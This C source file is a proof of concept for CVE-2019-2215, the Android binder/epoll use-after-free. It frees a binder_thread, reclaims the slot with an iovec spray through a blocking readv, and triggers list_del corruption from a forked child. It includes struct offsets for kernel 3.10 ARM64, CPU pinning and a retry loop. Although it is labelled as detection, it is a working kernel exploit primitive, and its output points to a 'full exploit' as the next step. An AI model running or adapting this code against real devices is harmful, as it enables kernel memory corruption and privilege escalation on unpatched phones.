/*
 * binder_uaf_poc.c - CVE-2019-2215 UAF trigger and detection
 * Tests whether the binder/epoll UAF exists on this kernel.
 *
 * The bug: BINDER_THREAD_EXIT frees binder_thread while epoll
 * still holds a reference to thread->wait. When epoll cleans up,
 * it does list_del on freed (potentially reallocated) memory.
 *
 * Detection: We free the binder_thread, spray iovec arrays into
 * the freed slot via readv (which blocks on empty pipe), then have
 * a child trigger EPOLL_CTL_DEL. If the in-kernel iovec copy gets
 * corrupted by list_del, readv returns EFAULT or a partial read.
 *
 * This version adds CPU pinning and a retry loop to maximize the
 * chance of the iovec landing in the freed binder_thread slot.
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o binder_uaf_poc binder_uaf_poc.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/wait.h>

/* Binder ioctl definitions */
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, unsigned int)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

/*
 * Struct layout for kernel 3.10 ARM64:
 *
 * struct binder_thread (approx 296-304 bytes, kmalloc-512):
 *   +0x00: binder_proc *proc          (8B)
 *   +0x08: rb_node rb_node            (24B)
 *   +0x20: int pid                    (4B)
 *   +0x24: int looper                 (4B)
 *   +0x28: binder_transaction *t_stack (8B)
 *   +0x30: list_head todo             (16B)
 *   +0x40: uint32_t return_error      (4B)
 *   +0x44: uint32_t return_error2     (4B)
 *   +0x48: wait_queue_head_t wait     (24B)
 *       +0x48: spinlock_t lock        (4B)
 *       +0x4C: padding                (4B)
 *       +0x50: list_head task_list.next (8B)  <-- UAF write target
 *       +0x58: list_head task_list.prev (8B)  <-- UAF write target
 *   +0x60: binder_stats stats         (~196B)
 *   Total: ~0x124 padded to 0x128 or 0x130
 */

#define BINDER_THREAD_SZ    0x130   /* Conservative estimate, rounds to kmalloc-512 */
#define WAITQUEUE_OFFSET    0x48
#define IOVEC_ARRAY_SZ      (BINDER_THREAD_SZ / sizeof(struct iovec))  /* 19 iovecs */
#define IOVEC_INDX_FOR_WQ   (WAITQUEUE_OFFSET / sizeof(struct iovec))  /* index 4 */

/* After UAF, task_list.next is at offset 0x50 = iovec[5].iov_base
 * and task_list.prev is at offset 0x58 = iovec[5].iov_len */
#define UAF_SPINLOCK_INDX   IOVEC_INDX_FOR_WQ       /* 4: overlaps wait.lock */
#define UAF_LIST_INDX       (IOVEC_INDX_FOR_WQ + 1) /* 5: overlaps task_list */

#define NUM_ATTEMPTS        50
#define NUM_CPUS            6   /* Cortex-A53 x4 + Cortex-A57 x2 on SD808 */

static int force_binder_thread(int binder_fd)
{
    struct binder_write_read bwr;
    char buf[32];
    memset(&bwr, 0, sizeof(bwr));
    bwr.read_size = sizeof(buf);
    bwr.read_buffer = (unsigned long)buf;
    ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    return 0;
}

static int pin_to_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}

/*
 * Run a single UAF attempt. Returns:
 *   1 = UAF detected (EFAULT or partial read at UAF boundary)
 *   0 = no detection (spray missed slot)
 *  -1 = error
 */
static int try_uaf(int attempt, int cpu, int verbose)
{
    int binder_fd, epfd, pipefd[2];
    struct epoll_event event = { .events = EPOLLIN };
    struct iovec iov[IOVEC_ARRAY_SZ];
    char bufs[IOVEC_ARRAY_SZ][64];

    /* Pin to specific CPU so free+alloc use the same per-cpu slab page */
    pin_to_cpu(cpu);

    /* Open binder, force thread, add to epoll */
    binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) return -1;

    force_binder_thread(binder_fd);

    epfd = epoll_create(1000);
    if (epfd < 0) { close(binder_fd); return -1; }
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event) < 0) {
        close(epfd); close(binder_fd); return -1;
    }

    if (pipe(pipefd) < 0) {
        close(epfd); close(binder_fd); return -1;
    }

    /* ALL iovecs must be valid — kernel validates AFTER kmalloc'ing the copy.
     * If any entry fails access_ok, readv returns EINVAL before blocking. */
    for (int i = 0; i < (int)IOVEC_ARRAY_SZ; i++) {
        memset(bufs[i], 0x41 + i, 64);
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = sizeof(bufs[i]);
    }

    /* Fork: child triggers UAF after parent enters readv */
    pid_t pid = fork();
    if (pid < 0) {
        close(pipefd[0]); close(pipefd[1]);
        close(epfd); close(binder_fd);
        return -1;
    }

    if (pid == 0) {
        /* === CHILD === */
        pin_to_cpu(cpu);

        /* Wait for parent to free binder_thread and enter readv.
         * The timing matters: readv must have kmalloc'd the iovec copy
         * and be blocking on pipe_wait BEFORE we trigger list_del. */
        usleep(100000); /* 100ms — shorter than before for tighter racing */

        /* Trigger list_del on freed binder_thread->wait.task_list */
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);

        /* Small delay to let list_del complete before writing pipe data */
        usleep(10000); /* 10ms */

        /* Write data to pipe to unblock parent's readv */
        char data[64];
        memset(data, 'Z', sizeof(data));
        for (int i = 0; i < (int)IOVEC_ARRAY_SZ; i++) {
            write(pipefd[1], data, 64);
        }
        _exit(0);
    }

    /* === PARENT === */
    /* Free the binder_thread while epoll still references it */
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);

    /* readv with >8 iovecs forces kmalloc(19*16=304) → kmalloc-512.
     * This SHOULD land in the freed binder_thread slot (same cache).
     * readv blocks on pipe_wait until child writes data. */
    ssize_t bytes = readv(pipefd[0], iov, IOVEC_ARRAY_SZ);
    int readv_errno = errno;

    /* Reap child */
    waitpid(pid, NULL, 0);

    /* Cleanup */
    close(pipefd[0]);
    close(pipefd[1]);
    close(epfd);
    close(binder_fd);

    /* Analyze result */
    int expected = (int)IOVEC_ARRAY_SZ * 64;

    if (bytes < 0 && readv_errno == 14 /* EFAULT */) {
        printf("\n[+] ATTEMPT %d (cpu %d): readv returned EFAULT!\n", attempt, cpu);
        printf("[+] list_del corrupted in-kernel iov[%d] to a kernel address.\n",
               UAF_LIST_INDX);
        printf("[+] CVE-2019-2215 IS PRESENT AND EXPLOITABLE!\n");
        return 1;
    }

    if (bytes >= 0 && bytes < expected) {
        int iov_boundary = UAF_LIST_INDX * 64;
        if (bytes <= iov_boundary) {
            printf("\n[+] ATTEMPT %d (cpu %d): readv partial (%zd bytes, stopped at iov[%d])!\n",
                   attempt, cpu, bytes, UAF_LIST_INDX);
            printf("[+] CVE-2019-2215 LIKELY PRESENT!\n");
            return 1;
        }
        if (verbose) {
            printf("  [%d] partial read %zd/%d (past UAF boundary)\n",
                   attempt, bytes, expected);
        }
        return 0;
    }

    if (bytes >= expected) {
        /* Full read — spray missed the slot. Check for anomalies. */
        for (int i = 0; i < (int)IOVEC_ARRAY_SZ; i++) {
            for (int j = 0; j < 64; j++) {
                unsigned char c = (unsigned char)bufs[i][j];
                if (c != 'Z' && c != (0x41 + i)) {
                    printf("\n[!] ATTEMPT %d (cpu %d): ANOMALY in iov[%d] byte %d: 0x%02x\n",
                           attempt, cpu, i, j, c);
                    printf("    First 16 bytes: ");
                    for (int k = 0; k < 16; k++)
                        printf("%02x ", (unsigned char)bufs[i][k]);
                    printf("\n");
                    return 1;
                }
            }
        }
        return 0; /* clean, no reclaim */
    }

    /* Unexpected error */
    if (verbose) {
        printf("  [%d] readv=%zd errno=%d (%s)\n",
               attempt, bytes, readv_errno, strerror(readv_errno));
    }
    return 0;
}

int main(void)
{
    printf("=== CVE-2019-2215 UAF PoC v2 (Binder/Epoll) ===\n");
    printf("uid=%d euid=%d\n", getuid(), geteuid());
    printf("BINDER_THREAD_SZ=0x%lx, IOVEC_ARRAY_SZ=%lu, UAF_LIST_INDX=%d\n",
           (unsigned long)BINDER_THREAD_SZ, (unsigned long)IOVEC_ARRAY_SZ,
           UAF_LIST_INDX);
    printf("Running %d attempts across %d CPUs...\n\n", NUM_ATTEMPTS, NUM_CPUS);

    /* Quick sanity check */
    int bfd = open("/dev/binder", O_RDONLY);
    if (bfd < 0) {
        printf("[-] /dev/binder: %s\n", strerror(errno));
        return 1;
    }
    force_binder_thread(bfd);
    int ret = ioctl(bfd, BINDER_THREAD_EXIT, NULL);
    printf("[+] BINDER_THREAD_EXIT: %s\n", ret == 0 ? "OK" : "FAILED");
    close(bfd);

    if (ret != 0) {
        printf("[-] Cannot free binder threads, aborting\n");
        return 1;
    }

    /* Run attempts, rotating across CPUs */
    int detected = 0;
    for (int i = 0; i < NUM_ATTEMPTS && !detected; i++) {
        int cpu = i % NUM_CPUS;

        if (i % 10 == 0)
            printf("[*] Attempts %d-%d (cpu rotation)...\n",
                   i, i + 9 < NUM_ATTEMPTS ? i + 9 : NUM_ATTEMPTS - 1);

        int result = try_uaf(i, cpu, (i < 3));
        if (result == 1) {
            detected = 1;
        } else if (result == -1 && i == 0) {
            printf("[-] First attempt failed, aborting\n");
            return 1;
        }
    }

    printf("\n=== RESULT ===\n");
    if (detected) {
        printf("[+] CVE-2019-2215 UAF CONFIRMED on this kernel!\n");
        printf("[+] The binder/epoll UAF is triggerable and the slab reclaim works.\n");
        printf("[+] Proceed to full exploit (binder_exploit).\n");
    } else {
        printf("[-] UAF not detected after %d attempts across %d CPUs.\n",
               NUM_ATTEMPTS, NUM_CPUS);
        printf("[-] Slab hardening likely prevents cross-caller-site reclaim.\n");
        printf("[-] This is consistent with Sessions 11-12 findings.\n");
        printf("[-] The vulnerability EXISTS in the code but cannot be exploited\n");
        printf("    via the standard iovec spray technique on this kernel.\n");
    }

    printf("\nIf kernel hasn't panicked, CONFIG_DEBUG_LIST is likely disabled.\n");
    printf("=== DONE ===\n");
    return detected ? 0 : 2;
}
